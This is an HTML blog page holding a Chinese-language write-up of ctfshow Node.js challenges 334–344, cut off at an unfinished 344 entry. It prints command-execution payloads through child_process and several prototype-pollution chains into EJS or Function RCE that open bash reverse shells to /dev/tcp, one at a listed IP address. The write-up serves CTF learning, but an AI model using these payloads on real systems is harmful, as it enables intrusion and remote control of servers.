@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="# 前言文档先阅读一遍 Node.js 教程 | 菜鸟教程 (runoob.com) 常见漏洞 Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com) nodejs一些入门特性&amp;&amp;实战 - 先知社区 (aliyun.com) 原型链污染 深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com) 模板引擎rce">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow nodejs">
+<meta property="og:url" content="http://example.com/2021/11/16/ctfshow%20nodejs/index.html">
+<meta property="og:site_name" content="Y0ng的博客">
+<meta property="og:description" content="# 前言文档先阅读一遍 Node.js 教程 | 菜鸟教程 (runoob.com) 常见漏洞 Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com) nodejs一些入门特性&amp;&amp;实战 - 先知社区 (aliyun.com) 原型链污染 深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com) 模板引擎rce">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a12160dc630c4b9d895ffcbc1b98bf3d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/669a9ce6cb3a4006a6a95c078798130a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b9c0dad4009e455b86acc87a20bfda94.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/bcd70f18cb2d471da1b7ce45f4a9b10a.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8d4f301a8c344224ada47b1e3fcb106d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/128a8a59555a4938a35dd05c09984d0e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f501b322306f4f748f837500092f6433.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0213ae95e0d44608aef4934bec224708.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3d8531860ee9446984950bb6bd55477b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2579f751f6ce46a5aea6904d6941960a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/30a7f61ce2ea49fe880d85e058c8ae53.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7d16a01eb0db4113a10b96eccdff01bf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_18,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/88f5229927f14d04a6670833c2047d32.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8f67e3c19e7044628d88aea697593b86.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c2dd7c1ec8174d7f89b6bc2cbca79af8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_16,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/34b26e479ce54df79f007fba54123da8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="article:published_time" content="2021-11-16T03:34:23.530Z">
+<meta property="article:modified_time" content="2021-11-16T03:34:13.746Z">
+<meta property="article:author" content="Y0ng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/a12160dc630c4b9d895ffcbc1b98bf3d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+
+<link rel="canonical" href="http://example.com/2021/11/16/ctfshow%20nodejs/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ctfshow nodejs | Y0ng的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y0ng的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">16</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">110</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/16/ctfshow%20nodejs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="Y0ng">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow nodejs
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-16 11:34:23 / 修改时间：11:34:13" itemprop="dateCreated datePublished" datetime="2021-11-16T11:34:23+08:00">2021-11-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>﻿# 前言<br>文档先阅读一遍</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/nodejs/nodejs-tutorial.html">Node.js 教程 | 菜鸟教程 (runoob.com)</a></p>
+<p>常见漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184#toc-0">Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7752#toc-0">nodejs一些入门特性&amp;&amp;实战 - 先知社区 (aliyun.com)</a></p>
+<p>原型链污染</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</a></p>
+<p>模板引擎rce</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6113#toc-4">XNUCA2019 Hardjs题解 从原型链污染到RCE - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">再探 JavaScript 原型链污染到 RCE - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://tari.moe/2021/05/04/ctfshow-nodejs/">ctfshow nodejs篇 - TARI TARI</a></p>
+<a id="more"></a>
+
+<h1 id="334"><a href="#334" class="headerlink" title="334"></a>334</h1><p><img src="https://img-blog.csdnimg.cn/a12160dc630c4b9d895ffcbc1b98bf3d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>变大写操作</p>
+<p><img src="https://img-blog.csdnimg.cn/669a9ce6cb3a4006a6a95c078798130a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>传小写 ctfshow 123456即可</p>
+<h1 id="335-336-系统命令"><a href="#335-336-系统命令" class="headerlink" title="335-336-系统命令"></a>335-336-系统命令</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Node.js中的chile_process.exec调用的是&#x2F;bash.sh，它是一个bash解释器，可以执行系统命令。</span><br><span class="line">在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/b9c0dad4009e455b86acc87a20bfda94.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>发现返回的是 [object Object]</p>
+<p>查看文档：</p>
+<p><a target="_blank" rel="noopener" href="http://nodejs.cn/api/child_process.html#child_processexeccommand-options-callback">child_process 子进程 | Node.js API 文档 (nodejs.cn)</a></p>
+<p>发现exec返回的是</p>
+<p><img src="https://img-blog.csdnimg.cn/bcd70f18cb2d471da1b7ce45f4a9b10a.png#pic_center"><br>通过查找所有可替换用法 <code>execSync</code> <code>spawnSync</code></p>
+<p>spawnSync():</p>
+<p><img src="https://img-blog.csdnimg.cn/8d4f301a8c344224ada47b1e3fcb106d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>Payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">法一：系统命令</span><br><span class="line">?eval&#x3D;require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString();</span><br><span class="line">?eval&#x3D;require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).output;</span><br><span class="line">?eval&#x3D;require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout;</span><br><span class="line">?eval&#x3D;global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;ls&#39;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">法二：</span><br><span class="line">文件操作</span><br><span class="line">?eval&#x3D;require(&#39;fs&#39;).readdirSync(&#39;.&#39;);</span><br><span class="line">?eval&#x3D;require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://nodejs.cn/learn/the-nodejs-fs-module">Node.js 文件系统模块 (nodejs.cn)</a></p>
+<p><img src="https://img-blog.csdnimg.cn/128a8a59555a4938a35dd05c09984d0e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">法三 拼接</span><br><span class="line">&#39;+&#39; 要urlencode一下</span><br><span class="line">?eval&#x3D;var a&#x3D;&quot;require(&#39;child_process&#39;).ex&quot;;var b&#x3D;&quot;ecSync(&#39;ls&#39;).toString();&quot;;eval(a%2Bb); </span><br><span class="line">?eval&#x3D;require(&#39;child_process&#39;)[&#39;ex&#39;%2B&#39;ecSync&#39;](&#39;cat f*&#39;)</span><br></pre></td></tr></table></figure>
+
+<h1 id="367-md5"><a href="#367-md5" class="headerlink" title="367-md5"></a>367-md5</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.query.a;</span><br><span class="line">  <span class="keyword">var</span> b = req.query.b;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;</span><br><span class="line">  	res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	res.render(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
+
+<p>数组绕过?a[]=1&amp;b[]=1</p>
+<h1 id="368-原型链污染"><a href="#368-原型链污染" class="headerlink" title="368-原型链污染"></a>368-原型链污染</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.session;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  <span class="keyword">if</span>(secert.ctfshow===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="built_in">JSON</span>.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>前面有一个copy函数，可以与链接文章里面的merge函数类比</p>
+<p>污染 user 让secert.ctfshow为36dboy</p>
+<p>Payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;1&quot;,&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="339"><a href="#339" class="headerlink" title="339"></a>339</h1><p>这里让输入flag所以没法直接利用了</p>
+<p><img src="https://img-blog.csdnimg.cn/f501b322306f4f748f837500092f6433.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>ejs rce</p>
+<p><img src="https://img-blog.csdnimg.cn/0213ae95e0d44608aef4934bec224708.png#pic_center"></p>
+<p>Ejs引擎可以rce ，具体过程参考上面链接</p>
+<p>Payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx&#x2F;6666 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>先污染一下 <code>outputFunctionName</code></p>
+<p><img src="https://img-blog.csdnimg.cn/3d8531860ee9446984950bb6bd55477b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>访问一下调用渲染，反弹shell</p>
+<p><img src="https://img-blog.csdnimg.cn/2579f751f6ce46a5aea6904d6941960a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p><img src="https://img-blog.csdnimg.cn/30a7f61ce2ea49fe880d85e058c8ae53.png#pic_center"></p>
+<p>污染query参数 再利用Function反弹shell</p>
+<p><img src="https://img-blog.csdnimg.cn/7d16a01eb0db4113a10b96eccdff01bf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_18,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>污染点在user 触发点在query</p>
+<p>/login下污染query</p>
+<p><img src="https://img-blog.csdnimg.cn/88f5229927f14d04a6670833c2047d32.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">/api下触发query</p>
+<p><img src="https://img-blog.csdnimg.cn/8f67e3c19e7044628d88aea697593b86.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>Payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;150.158.181.145&#x2F;2334 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="340"><a href="#340" class="headerlink" title="340"></a>340</h1><p>触发点还是query<br>但是污染点不一样了</p>
+<p><img src="https://img-blog.csdnimg.cn/c2dd7c1ec8174d7f89b6bc2cbca79af8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_16,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>user.userinfo向上污染两级才是Object对象</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;150.158.181.145&#x2F;2334 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="341"><a href="#341" class="headerlink" title="341"></a>341</h1><p>没了api 那就用ejs的rce</p>
+<h1 id="342-343"><a href="#342-343" class="headerlink" title="342-343"></a>342-343</h1><p>具体过程分析参考前言模板rce</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;150.158.181.145&#x2F;2333 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><code>content-type要改为application/json</code></p>
+<h1 id="344"><a href="#344" class="headerlink" title="344"></a>344</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line"> res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line"> <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line"> <span class="keyword">if</span>(req.url.match(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line"> 	res.end(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">var</span> query = <span class="built_in">JSON</span>.parse(req.query.query);</span><br><span class="line"> <span class="keyword">if</span>(query.name===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.password===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.isVIP===<span class="literal">true</span>)&#123;</span><br><span class="line"> 	res.end(flag);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> 	res.end(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>即 url 中不能包含大小写 <code>8c、2c 和 逗号</code></p>
+<p><code>nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析</code></p>
+<p><img src="https://img-blog.csdnimg.cn/34b26e479ce54df79f007fba54123da8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>paylaod:</p>
